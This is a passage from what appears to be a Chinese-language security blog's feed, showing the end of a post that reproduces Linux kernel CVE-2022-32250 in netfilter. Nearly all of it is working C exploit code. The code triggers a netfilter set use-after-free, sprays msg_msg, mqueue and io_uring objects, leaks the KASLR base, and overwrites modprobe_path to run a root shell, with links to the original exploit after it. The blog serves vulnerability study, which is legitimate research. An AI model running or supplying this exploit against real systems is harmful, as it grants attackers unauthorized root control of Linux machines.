class="line"></span><br><span class="line">    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nl == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;mnl_socket_open&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] setting stable %s and set\n&quot;</span>, table_name);</span><br><span class="line">    <span class="keyword">if</span> (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),</span><br><span class="line">mnl_nlmsg_batch_size(batch)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;mnl_socket_send&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_trigger_set_and_overwrite</span><span class="params">(struct mnl_socket* nl, <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">const</span> <span class="keyword">char</span> *set_name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> * table_name = name;</span><br><span class="line">    <span class="keyword">uint8_t</span> family = NFPROTO_IPV4;</span><br><span class="line">    <span class="keyword">uint32_t</span> set_id = <span class="number">1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nftnl_expr</span> * <span class="title">exprs</span>[128];</span></span><br><span class="line">    <span class="keyword">int</span> exprid = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> * <span class="title">nlh</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nftnl_set</span> * <span class="title">set_trigger</span> =</span> nftnl_set_alloc();</span><br><span class="line"></span><br><span class="line">    nftnl_set_set_str(set_trigger, NFTNL_SET_TABLE, table_name);</span><br><span class="line">    nftnl_set_set_str(set_trigger, NFTNL_SET_NAME, set_name);</span><br><span class="line">    nftnl_set_set_u32(set_trigger, NFTNL_SET_FLAGS, NFT_SET_EXPR);</span><br><span class="line">    nftnl_set_set_u32(set_trigger, NFTNL_SET_KEY_LEN, <span class="number">1</span>);</span><br><span class="line">    nftnl_set_set_u32(set_trigger, NFTNL_SET_FAMILY, family);</span><br><span class="line">    nftnl_set_set_u32(set_trigger, NFTNL_SET_ID, set_id);</span><br><span class="line">    exprs[exprid] = nftnl_expr_alloc(<span class="string">&quot;lookup&quot;</span>);</span><br><span class="line">    nftnl_expr_set_str(exprs[exprid], NFTNL_EXPR_LOOKUP_SET, <span class="string">&quot;set_stable&quot;</span>);</span><br><span class="line">    nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_LOOKUP_SREG, NFT_REG_1);</span><br><span class="line">    nftnl_set_add_expr(set_trigger, exprs[exprid]);</span><br><span class="line">    exprid++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[MNL_SOCKET_BUFFER_SIZE*<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mnl_nlmsg_batch</span> * <span class="title">batch</span> =</span> mnl_nlmsg_batch_start(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">int</span> seq = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line">    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),</span><br><span class="line">                                    NFT_MSG_NEWSET, family,</span><br><span class="line">                                    NLM_F_CREATE|NLM_F_ACK, seq++);</span><br><span class="line">    nftnl_set_nlmsg_build_payload(nlh, set_trigger);</span><br><span class="line">    nftnl_set_free(set_trigger);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line">    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nl == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;mnl_socket_open&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),</span><br><span class="line">mnl_nlmsg_batch_size(batch)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;mnl_socket_send&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] triggering UAF set and overwrite *(prevchunk+0x18)\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_cpu_affinity</span><span class="params">(<span class="keyword">int</span> cpu_n, <span class="keyword">pid_t</span> pid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">cpu_set_t</span> <span class="built_in">set</span>;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;<span class="built_in">set</span>);</span><br><span class="line">    CPU_SET(cpu_n, &amp;<span class="built_in">set</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sched_setaffinity(pid, <span class="keyword">sizeof</span>(<span class="built_in">set</span>), &amp;<span class="built_in">set</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        do_error_exit(<span class="string">&quot;sched_setaffinity&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spray_mqueue</span><span class="params">(<span class="keyword">mqd_t</span> mqdes, <span class="keyword">char</span> *msgptr, <span class="keyword">int</span> spray_size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> msgrv[BUFFER];</span><br><span class="line"><span class="keyword">unsigned</span> rvprio, sdprio = <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">ts</span>;</span></span><br><span class="line"><span class="keyword">int</span> unresolved = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> priority = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] spraying mqueue...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;spray_size; i++)</span><br><span class="line">        <span class="keyword">if</span> (mq_send(mqdes, msgptr, <span class="number">0x28</span>, sdprio) != <span class="number">0</span>)</span><br><span class="line">            perror(ERROR_PREFIX <span class="string">&quot;mq_send&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gather_mqueue</span><span class="params">(<span class="keyword">mqd_t</span> mqdes, <span class="keyword">int</span> gather_size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> priority = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> msg[BUFFER];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] gathering mqueue...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;gather_size; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (mq_receive(mqdes, (<span class="keyword">char</span>*) &amp;msg, BUFFER, <span class="literal">NULL</span>) != <span class="number">-1</span>)</span><br><span class="line">        &#123;   </span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(*((<span class="keyword">uint64_t</span> *)msg) &amp; <span class="number">0xffffffff00000000</span> != <span class="number">0xffffffff00000000</span>)</span><br><span class="line">                bye(<span class="string">&quot;[-] can&#x27;t leak base... \n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            base_base = *((<span class="keyword">uint64_t</span> *)msg) - <span class="number">0x51af80</span>;</span><br><span class="line">            modprobe_addr = base_base + <span class="number">0x1e8b320</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] KASLR base: 0x%llx\n&quot;</span>, base_base);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] modprobe addr: 0x%llx\n&quot;</span>, modprobe_addr);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gather_mqueue_nosave</span><span class="params">(<span class="keyword">mqd_t</span> mqdes, <span class="keyword">int</span> gather_size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> priority = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> msg[BUFFER];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] gathering mqueue...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;gather_size; i++)</span><br><span class="line">        mq_receive(mqdes, (<span class="keyword">char</span>*) &amp;msg, BUFFER, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spray_msg_msg</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">int</span> amount, <span class="keyword">int</span> qid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">0x2000</span>];</span><br><span class="line">    msg *spray = (msg *)buffer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// assert(size &gt;= 0x31 &amp;&amp; size &lt;= 0x1000 - 0x8);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] try to spray msg_msg\n&quot;</span>);</span><br><span class="line">    spray-&gt;mtype = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(spray-&gt;mtext, <span class="number">0x41</span>, size - <span class="number">0x30</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; amount; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(i % <span class="number">0x10</span> == <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] spraying msg_msg: 0x%x\n&quot;</span>, i);</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(qid, spray, size - <span class="number">0x30</span>, <span class="number">0</span>) == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            perror(<span class="string">&quot;msgsend failure&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">io_uring_setup</span><span class="params">(<span class="keyword">uint32_t</span> entries, struct io_uring_params *p)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_io_uring_setup, entries, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">io_uring_register</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">unsigned</span> <span class="keyword">int</span> opcode, <span class="keyword">void</span> *arg, <span class="keyword">unsigned</span> <span class="keyword">int</span> nr_args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_io_uring_register, fd, opcode, arg, nr_args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct fd_uring *<span class="title">spray_uring</span><span class="params">(<span class="keyword">uint32_t</span> spray_size, struct fd_uring *fd_buffer)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint64_t</span> i = <span class="number">0</span>; i &lt; spray_size; i++) &#123;</span><br><span class="line"></span><br><span class="line">        fd_buffer[i].params = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct io_uring_params));</span><br><span class="line">        <span class="keyword">if</span> (!fd_buffer[i].params)</span><br><span class="line">            do_error_exit(<span class="string">&quot;malloc&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(fd_buffer[i].params, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct io_uring_params));</span><br><span class="line"></span><br><span class="line">        fd_buffer[i].fd = io_uring_setup(SPRAY_NB_ENTRIES, fd_buffer[i].params);</span><br><span class="line">        <span class="keyword">if</span> (fd_buffer[i].fd &lt; <span class="number">0</span>)</span><br><span class="line">            do_error_exit(<span class="string">&quot;io_uring_create&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fd_buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">release_uring</span><span class="params">(struct fd_uring *fd_buffer, <span class="keyword">uint32_t</span> buffer_size)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; buffer_size; i++) &#123;</span><br><span class="line">        close(fd_buffer[i].fd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(fd_buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">release_partial_uring</span><span class="params">(struct fd_uring *fd_buffer, <span class="keyword">uint32_t</span> buffer_idx)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    close(fd_buffer[buffer_idx].fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_root_shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    create_dummy_file();</span><br><span class="line">    create_priv_file();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_dummy_file</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line">    fd = open(dummy_file, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);</span><br><span class="line">    write(fd, dummy_content, <span class="keyword">sizeof</span>(dummy_content));</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_priv_file</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line">    fd = open(priv_file, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);</span><br><span class="line">    write(fd, priv_context, <span class="keyword">sizeof</span>(priv_context));</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;gcc -o /tmp/shell /tmp/shell.c -w&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_new_modprobe</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd, fd_modprobe;</span><br><span class="line">    <span class="keyword">char</span> modprobe_name[<span class="number">0x10</span>] = &#123;<span class="number">0</span>, &#125;;</span><br><span class="line"></span><br><span class="line">    fd_modprobe = open(<span class="string">&quot;/proc/sys/kernel/modprobe&quot;</span>, O_RDONLY);</span><br><span class="line">    read(fd_modprobe, modprobe_name, <span class="number">14</span>);</span><br><span class="line">    close(fd_modprobe);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] current modprobe name: %s\n&quot;</span>, modprobe_name);</span><br><span class="line">    fd = open(modprobe_name, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">        do_error_exit(<span class="string">&quot;open&quot;</span>);</span><br><span class="line"></span><br><span class="line">    write(fd, new_modprobe_content, <span class="keyword">sizeof</span>(new_modprobe_content));</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup_modprobe_payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    write_new_modprobe();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">userland_T</span><span class="params">(<span class="keyword">int</span> *sema)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(*sema);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sema_up</span><span class="params">(<span class="keyword">int</span> *sema)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *sema = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sema_down</span><span class="params">(<span class="keyword">int</span> *sema)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *sema = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> ** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">char</span> writebuf[<span class="number">0x2000</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> mqname[MQUEUE_NUM][NAMELEN] = &#123;<span class="string">&quot;/qname1&quot;</span>, <span class="string">&quot;/qname2&quot;</span>, <span class="string">&quot;/qname3&quot;</span>, <span class="string">&quot;/qname4&quot;</span>, <span class="string">&quot;/qname5&quot;</span>&#125;;</span><br><span class="line">    <span class="keyword">mqd_t</span> mqid[MQUEUE_NUM];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mq_attr</span> <span class="title">attr</span>;</span></span><br><span class="line">attr.mq_flags   = <span class="number">0</span>;</span><br><span class="line">attr.mq_maxmsg  = <span class="number">10</span>;</span><br><span class="line">attr.mq_msgsize = BUFFER;</span><br><span class="line">attr.mq_curmsgs = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> uaf_id = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> *sema = mmap(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> *sema2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    prepare_root_shell();</span><br><span class="line">    sema_up(sema);</span><br><span class="line">    <span class="keyword">if</span>(fork())</span><br><span class="line">    &#123;</span><br><span class="line">        set_cpu_affinity(<span class="number">1</span>, getpid());</span><br><span class="line">        userland_T(sema);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\n[------------------------- stage 4: Execute Malicious File -------------------------------]\n&quot;</span>);</span><br><span class="line">        setup_modprobe_payload();</span><br><span class="line">        execve(<span class="string">&quot;/tmp/dummy&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">        execve(<span class="string">&quot;/tmp/shell&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    unshare_setup(getuid(), getgid());</span><br><span class="line"></span><br><span class="line">    set_cpu_affinity(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fd_uring</span> *<span class="title">fd_buffer</span> =</span> <span class="built_in">calloc</span>(SPRAY_SIZE, <span class="keyword">sizeof</span>(struct fd_uring));</span><br><span class="line">    <span class="keyword">if</span> (!fd_buffer)</span><br><span class="line">        do_error_exit(<span class="string">&quot;calloc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)</span><br><span class="line">        <span class="keyword">if</span>((mqid[i] = mq_open(mqname[i], O_CREAT | O_RDWR, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH, &amp;attr)) &lt; <span class="number">0</span>)</span><br><span class="line">            bye(<span class="string">&quot;MQUEUE&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mnl_socket</span>* <span class="title">nl</span> =</span> mnl_socket_open(NETLINK_NETFILTER);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n[------------------------- stage 0: Allocate stable table and set ------------------------]\n&quot;</span>);</span><br><span class="line">    set_stable_table_and_set(nl, <span class="string">&quot;table1&quot;</span>);</span><br><span class="line">    set_stable_table_and_set(nl, <span class="string">&quot;table2&quot;</span>);</span><br><span class="line">    set_stable_table_and_set(nl, <span class="string">&quot;table3&quot;</span>);</span><br><span class="line">    set_stable_table_and_set(nl, <span class="string">&quot;table4&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n[------------------------- stage 1: Leak heap address ------------------------------------]\n&quot;</span>);</span><br><span class="line">    set_trigger_set_and_overwrite(nl, <span class="string">&quot;table1&quot;</span>, <span class="string">&quot;set_trigger0&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">key_serial_t</span> *id_buffer = spray_keyring(<span class="number">0</span>, SPRAY_KEY_SIZE);</span><br><span class="line"></span><br><span class="line">    set_trigger_set_and_overwrite(nl, <span class="string">&quot;table1&quot;</span>, <span class="string">&quot;set_trigger1&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>((uaf_id = get_keyring_leak(id_buffer, SPRAY_KEY_SIZE)) == SPRAY_KEY_SIZE)</span><br><span class="line">        bye(<span class="string">&quot;[-] leak failed...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n[------------------------- stage 2: Leak KASLR address -----------------------------------]\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    spray_uring(SPRAY_SIZE, fd_buffer);</span><br><span class="line"></span><br><span class="line">    set_trigger_set_and_overwrite(nl, <span class="string">&quot;table2&quot;</span>, <span class="string">&quot;set_trigger2&quot;</span>);</span><br><span class="line">    spray_mqueue(mqid[<span class="number">0</span>], <span class="string">&quot;TESTMSGTESTMSGTESTMSGTESTMSGTESTMSG&quot;</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    release_partial_uring(fd_buffer, SPRAY_SIZE<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>; i &gt; <span class="number">113</span>; i++)</span><br><span class="line">        release_partial_uring(fd_buffer, SPRAY_SIZE-i);</span><br><span class="line">    release_partial_uring(fd_buffer, SPRAY_SIZE<span class="number">-2</span>);</span><br><span class="line">    set_trigger_set_and_overwrite(nl, <span class="string">&quot;table2&quot;</span>, <span class="string">&quot;set_trigger3&quot;</span>);</span><br><span class="line">    <span class="keyword">key_serial_t</span> *id_buffer3 = spray_keyring_list_del_purpose(SPRAY_KEY_SIZE*<span class="number">2</span>, heap_base, heap_base, <span class="number">0x28</span>);<span class="comment">// keyring &lt;-&gt; msg_msg overlap</span></span><br><span class="line">    gather_mqueue(mqid[<span class="number">0</span>], <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n[------------------------- stage 3: Overwrite modprobe_path ------------------------------]\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    set_trigger_set_and_overwrite(nl, <span class="string">&quot;table3&quot;</span>, <span class="string">&quot;set_trigger4&quot;</span>);</span><br><span class="line">    spray_mqueue(mqid[<span class="number">1</span>], <span class="string">&quot;TESTMSGTESTMSGTESTMSGTESTMSGTESTMSG&quot;</span>, <span class="number">4</span>);</span><br><span class="line">    set_trigger_set_and_overwrite(nl, <span class="string">&quot;table3&quot;</span>, <span class="string">&quot;set_trigger5&quot;</span>);</span><br><span class="line">    id_buffer = spray_keyring_list_del_purpose(<span class="number">1</span>, modprobe_addr<span class="number">-0x8</span>+<span class="number">0x1</span>, (heap_base&amp;<span class="number">0xffffffff00000000</span>)+<span class="number">0x2f706d74</span>, <span class="number">0x10</span>);</span><br><span class="line">    sema_down(sema);</span><br><span class="line">    gather_mqueue_nosave(mqid[<span class="number">1</span>], <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=SPRAY_SIZE/<span class="number">2</span>+<span class="number">12</span>; i&lt;SPRAY_SIZE; i++)</span><br><span class="line">        release_partial_uring(fd_buffer, i);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里也用了<code>io_uring</code>，不过我看其申请的参数其实是<code>GFP_KERNEL_ACCOUNT</code>，不明白为什么这里又可以进行占位了( 有种自相矛盾的感觉 )。</p><hr><p>参考链接:</p><p>​<a class="link"   href="https://blog.theori.io/linux-kernel-exploit-cve-2022-32250-with-mqueue-a8468f32aab5" >https://blog.theori.io/linux-kernel-exploit-cve-2022-32250-with-mqueue-a8468f32aab5<i class="fas fa-external-link-alt"></i></a></p><p>​<a class="link"   href="https://github.com/theori-io/CVE-2022-32250-exploit" >https://github.com/theori-io/CVE-2022-32250-exploit<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;因为工作目前面对着一个不怎么熟悉的&lt;code&gt;netfilter&lt;/code&gt;这一模块，所以直接复现一个以往的CVE来认识认识这个模块。&lt;/</summary>
      
    
    
    
    <category term="Linux Kernel" scheme="https://196082.github.io/categories/Linux-Kernel/"/>
    
    <category term="CVE复现" scheme="https://196082.github.io/categories/Linux-Kernel/CVE%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="netfilter" scheme="https://196082.github.io/tags/netfilter/"/>
    
    <category term="user_key_payload" scheme="https://196082.github.io/tags/user-key-payload/"/>
    
    <category term="io_uring" scheme="https://196082.github.io/tags/io-uring/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-0995复现</title>
    <link href="https://196082.github.io/2023/08/21/CVE-2022-0995/"/>
    <id>https://196082.github.io/2023/08/21/CVE-2022-0995/</id>
    <published>2023-08-21T06:27:52.000Z</published>
    <updated>2023-11-29T10:11:26.000Z</updated>
    
